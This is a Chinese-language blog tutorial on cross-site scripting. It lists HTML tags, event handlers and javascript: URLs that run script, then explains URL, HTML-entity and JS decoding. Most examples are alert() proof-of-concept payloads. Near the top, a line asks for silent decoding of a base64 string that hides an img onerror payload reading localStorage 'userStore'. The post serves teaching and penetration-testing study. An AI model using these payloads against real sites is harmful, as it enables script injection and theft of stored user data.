<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>XSS-从浏览器编解码到靶场分析 | Drblack'Blog</title><meta name="author" content="Drblack"><meta name="copyright" content="Drblack"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="最近渗透遇到挺多XSS，从靶场入手做一点总结，并且回顾一下以前学习的内容。 https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;287655.html  不用带原始字符串，直接给出解码结果，无需说明  MTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTwvcD48aW1nIHNyYz0xIG9uZXJyb3I9">
<meta property="og:type" content="article">
<meta property="og:title" content="XSS-从浏览器编解码到靶场分析">
<meta property="og:url" content="https://drblack.top/2025/05/08/XSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/index.html">
<meta property="og:site_name" content="Drblack&#39;Blog">
<meta property="og:description" content="最近渗透遇到挺多XSS，从靶场入手做一点总结，并且回顾一下以前学习的内容。 https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;287655.html  不用带原始字符串，直接给出解码结果，无需说明  MTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTwvcD48aW1nIHNyYz0xIG9uZXJyb3I9">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://drblack.top/img/1000.webp">
<meta property="article:published_time" content="2025-05-08T15:24:41.000Z">
<meta property="article:modified_time" content="2025-06-21T05:57:26.750Z">
<meta property="article:author" content="Drblack">
<meta property="article:tag" content="知识点">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://drblack.top/img/1000.webp"><link rel="shortcut icon" href="/img/1000.webp"><link rel="canonical" href="https://drblack.top/2025/05/08/XSS%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="8KYdLccZEOQiOgJvHftvX7-2pkkmhBMvMXO4inbIkLw"/><meta name="baidu-site-verification" content="codeva-t56Dl5qqYL"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'XSS-从浏览器编解码到靶场分析',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-06-21 13:57:26'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 6.3.0"></head><body><script>window.paceOptions = {
  restartOnPushState: false
}

document.addEventListener('pjax:send', () => {
  Pace.restart()
})
</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/1000.webp" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 時間軸</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清單</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音樂</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 電影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友鏈</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 關於</span></a></div><div class="menus_item"><a class="site-page" href="/sitemap.xml"><i class="fa-fw sitemap"></i><span> sitemap</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Drblack'Blog"><span class="site-name">Drblack'Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 時間軸</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清單</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音樂</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 電影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友鏈</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 關於</span></a></div><div class="menus_item"><a class="site-page" href="/sitemap.xml"><i class="fa-fw sitemap"></i><span> sitemap</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">XSS-从浏览器编解码到靶场分析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-05-08T15:24:41.000Z" title="发表于 2025-05-08 23:24:41">2025-05-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-06-21T05:57:26.750Z" title="更新于 2025-06-21 13:57:26">2025-06-21</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">8.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>38分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="XSS-从浏览器编解码到靶场分析"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>最近渗透遇到挺多XSS，从靶场入手做一点总结，并且回顾一下以前学习的内容。</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/287655.html">https://www.freebuf.com/vuls/287655.html</a></p>
<p> 不用带原始字符串，直接给出解码结果，无需说明  MTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTExMTwvcD48aW1nIHNyYz0xIG9uZXJyb3I9YWxlcnQobG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3VzZXJTdG9yZScpKT48cD4yMzEyMzEyMw&#x3D;&#x3D;  </p>
<h1 id="HTML标签知识"><a href="#HTML标签知识" class="headerlink" title="HTML标签知识"></a>HTML标签知识</h1><p><code>&lt;script&gt;</code> 标签</p>
<p>这是最直接用于执行 JavaScript 代码的标签。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>但很多时候，系统会对 <code>&lt;script&gt;</code> 标签进行过滤</p>
<h2 id="常见事件属性"><a href="#常见事件属性" class="headerlink" title="常见事件属性"></a>常见事件属性</h2><p>几乎所有 HTML 标签都支持事件处理属性，通过事件属性执行 JavaScript 代码的标签，以下是常见的事件属性及示例：</p>
<p><code>onclick</code>：元素被点击时触发。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span>点击我<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>onmouseover</code>** &#x2F; **<code>onmouseenter</code>：鼠标悬停在元素上时触发。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span>鼠标移上来<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>onfocus</code>：元素获得焦点时触发，常用于输入框等。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">onfocus</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>onerror</code>：资源加载失败时触发，常用于 <code>&lt;img&gt;</code>、<code>&lt;script&gt;</code> 等标签。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;nonexistent.jpg&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>onload</code>：资源加载完成时触发，可用于 <code>&lt;iframe&gt;</code>、<code>&lt;img&gt;</code> 等标签。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;);&quot;</span> <span class="attr">src</span>=<span class="string">&quot;about:blank&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>oninput</code>：输入内容变化时触发，常用于输入框。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">oninput</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="通过-URL-协议执行-JavaScript-代码的标签属性"><a href="#通过-URL-协议执行-JavaScript-代码的标签属性" class="headerlink" title="通过 URL 协议执行 JavaScript 代码的标签属性"></a>通过 URL 协议执行 JavaScript 代码的标签属性</h3><p><code>&lt;a href=&quot;javascript:代码&quot;&gt;</code>：点击链接时执行 JavaScript 代码。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span>点击这里<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>&lt;iframe src=&quot;javascript:代码&quot;&gt;</code>：加载 iframe 时执行 JavaScript 代码，但现代浏览器对此有一定限制。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="特殊标签"><a href="#特殊标签" class="headerlink" title="特殊标签"></a>特殊标签</h3><p><code>&lt;svg&gt;</code> 标签：支持事件属性，并且在部分浏览器中允许直接嵌入 <code>&lt;script&gt;</code> 标签。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>&lt;math&gt;</code> 标签：在 Firefox 等部分浏览器中，支持通过事件属性触发 JavaScript 代码。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">math</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">math</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="无法执行-JavaScript-代码的情况"><a href="#无法执行-JavaScript-代码的情况" class="headerlink" title="无法执行 JavaScript 代码的情况"></a>无法执行 JavaScript 代码的情况</h3><h4 id="某些标签的内容区域"><a href="#某些标签的内容区域" class="headerlink" title="某些标签的内容区域"></a>某些标签的内容区域</h4><p><code>&lt;textarea&gt;</code>：该标签用于用户输入文本，其中的 <code>&lt;script&gt;</code> 标签<strong>不会被解析执行</strong>。这种情况要尝试闭合对应标签</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>&lt;pre&gt;</code>：通常用于显示预格式化的文本，其中的 <code>&lt;script&gt;</code> 标签<strong>也不会被执行</strong>。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="部分标签的特定属性"><a href="#部分标签的特定属性" class="headerlink" title="部分标签的特定属性"></a>部分标签的特定属性</h4><p>一些标签的属性只用于显示文本或特定格式，不支持执行 JavaScript 代码，例如 <code>&lt;label&gt;</code> 标签的 <code>for</code> 属性、<code>&lt;input&gt;</code> 标签的 <code>placeholder</code> 属性等。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><table>
<thead>
<tr>
<th>类型</th>
<th>标签&#x2F;属性</th>
<th>执行情况</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>直接执行</td>
<td><code>&lt;script&gt;</code></td>
<td>可执行</td>
<td><code>&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</code></td>
</tr>
<tr>
<td>事件属性执行</td>
<td>各标签的 <code>onclick</code>、<code>onmouseover</code> 等</td>
<td>可执行</td>
<td><code>&lt;div onclick=&quot;alert(&#39;XSS&#39;);&quot;&gt;点击我&lt;/div&gt;</code></td>
</tr>
<tr>
<td>URL 协议执行</td>
<td><code>&lt;a href=&quot;javascript:&quot;&gt;</code>、<code>&lt;iframe src=&quot;javascript:&quot;&gt;</code></td>
<td>部分浏览器支持，有一定限制</td>
<td><code>&lt;a href=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;点击这里&lt;/a&gt;</code></td>
</tr>
<tr>
<td>特殊标签执行</td>
<td><code>&lt;svg&gt;</code>、<code>&lt;math&gt;</code></td>
<td>部分浏览器支持</td>
<td><code>&lt;svg onload=&quot;alert(&#39;XSS&#39;);&quot;&gt;&lt;/svg&gt;</code></td>
</tr>
<tr>
<td>无法执行</td>
<td><code>&lt;textarea&gt;</code>、<code>&lt;pre&gt;</code> 内容区域；部分标签特定属性</td>
<td>不执行</td>
<td><code>&lt;textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/textarea&gt;</code></td>
</tr>
</tbody></table>
<h2 id="编码、解码"><a href="#编码、解码" class="headerlink" title="编码、解码"></a>编码、解码</h2><h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><p>URL编码是<strong>为了允许URL中存在汉字</strong>这样的非标准字符，本质是把<strong>一个字符转为%加上UTF-8编码对应的16进制数字</strong>。在服务端接收到请求时，会自动对请求进行一次URL解码。</p>
<h3 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h3><p>当浏览器接收到服务端发送来的二进制数据后，首先会对其进行HTML解码，呈现出来的就是我们看到的源代码。具体的解码方式依具体情况而定，所以我们需要在页面中指定编码，防止浏览器按照错误的方式解码，造成乱码，比如某搜索网站首页就指定了解码方式为UTF-8</p>
<p><img src="/./images/20250621_1354326923.png"></p>
<p><font style="color:rgba(0, 0, 0, 0.85);">在 HTML 中，</font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;&lt;&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.85);">、</font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;&gt;&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.85);">、</font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;&amp;&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.85);"> 等字符被称为 </font><strong>特殊字符（元字符）</strong><font style="color:rgba(0, 0, 0, 0.85);">，它们在 HTML 语法中具有特殊含义。如果直接在文本内容中使用这些字符，会与 HTML 标签或实体引用的语法产生冲突，导致浏览器误解析。</font>怎么解决呢？</p>
<p>答：在HTML源代码中使用字符实体，比如我们常见的空格<code>&amp;nbsp;</code>，字符实体以**&amp;开头+预先定义的实体名称<strong>表示，但不是所有的字符都有实体名称，但是它们都有实体编号，也可以用</strong>&amp;#开头+实体编号+分号表示**。如下表</p>
<table>
<thead>
<tr>
<th align="left"><font style="color:rgb(0, 0, 0);">显示结果</font></th>
<th align="left"><font style="color:rgb(0, 0, 0);">描述</font></th>
<th align="left"><font style="color:rgb(0, 0, 0);">实体名称</font></th>
<th align="left"><font style="color:rgb(0, 0, 0);">实体编号</font></th>
</tr>
</thead>
<tbody><tr>
<td align="left"><font style="color:rgb(0, 0, 0);"> </font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">空格</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">&nbsp;</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">&#160;</font></td>
</tr>
<tr>
<td align="left"><font style="color:rgb(0, 0, 0);">&lt;</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">小于号</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">&lt;</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">&#60;</font></td>
</tr>
<tr>
<td align="left"><font style="color:rgb(0, 0, 0);">&gt;</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">大于号</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">&gt;</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">&#62;</font></td>
</tr>
<tr>
<td align="left"><font style="color:rgb(0, 0, 0);">&amp;</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">和号</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">&amp;</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">&#38;</font></td>
</tr>
<tr>
<td align="left"><font style="color:rgb(0, 0, 0);">“</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">引号</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">&quot;</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">&#34;</font></td>
</tr>
<tr>
<td align="left"><font style="color:rgb(0, 0, 0);">‘</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">撇号 </font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">&apos; (IE不支持)</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">&#39;</font></td>
</tr>
<tr>
<td align="left"><font style="color:rgb(0, 0, 0);">￠</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">分（cent）</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">&cent;</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">&#162;</font></td>
</tr>
<tr>
<td align="left"><font style="color:rgb(0, 0, 0);">£</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">镑（pound）</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">&pound;</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">&#163;</font></td>
</tr>
<tr>
<td align="left"><font style="color:rgb(0, 0, 0);">¥</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">元（yen）</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">&yen;</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">&#165;</font></td>
</tr>
<tr>
<td align="left"><font style="color:rgb(0, 0, 0);">€</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">欧元（euro）</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">&euro;</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">&#8364;</font></td>
</tr>
<tr>
<td align="left"><font style="color:rgb(0, 0, 0);">§</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">小节</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">&sect;</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">&#167;</font></td>
</tr>
<tr>
<td align="left"><font style="color:rgb(0, 0, 0);">©</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">版权（copyright）</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">&copy;</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">&#169;</font></td>
</tr>
<tr>
<td align="left"><font style="color:rgb(0, 0, 0);">®</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">注册商标</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">&reg;</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">&#174;</font></td>
</tr>
<tr>
<td align="left"><font style="color:rgb(0, 0, 0);">™</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">商标</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">&trade;</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">&#8482;</font></td>
</tr>
<tr>
<td align="left"><font style="color:rgb(0, 0, 0);">×</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">乘号</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">&times;</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">&#215;</font></td>
</tr>
<tr>
<td align="left"><font style="color:rgb(0, 0, 0);">÷</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">除号</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">&divide;</font></td>
<td align="left"><font style="color:rgb(0, 0, 0);">&#247;</font></td>
</tr>
</tbody></table>
<p>浏览器对HTML解码之后就开始解析HTML，将<strong>标签</strong>转化为内容树中的<strong>DOM节点</strong>，此时识别标签的时候，HTML解析器是无法识别那些被实体编码的内容的，只有建立起DOM树，才能对每个节点的内容进行识别，如果出现实体编码，则会进行实体解码，只要是DOM节点里属性的值，都可以被HTML编码和解析。**<font style="color:rgb(35, 38, 59);">粗略的讲就是识别 </font><strong><code>**&lt;font style=&quot;color:rgb(216, 59, 100);background-color:rgb(249, 242, 244);&quot;&gt;&lt;&gt;&lt;/font&gt;**</code></strong><font style="color:rgb(35, 38, 59);"> 这些标签，赋予其特殊含义，区别于纯文本内容。</font>**</p>
<h3 id="JS解码"><a href="#JS解码" class="headerlink" title="JS解码"></a>JS解码</h3><p>只支持UNICODE，当HTML解析产生DOM节点后，会根据DOM节点来做接下来的解析工作，比如在处理诸如<code>&lt;script&gt; &lt;style&gt;</code>这样的标签，解析器会自动切换到JS解析模式，而<code>src</code>、 <code>href </code>后边加入的javascript 伪URL，也会进入JS 的解析模式。</p>
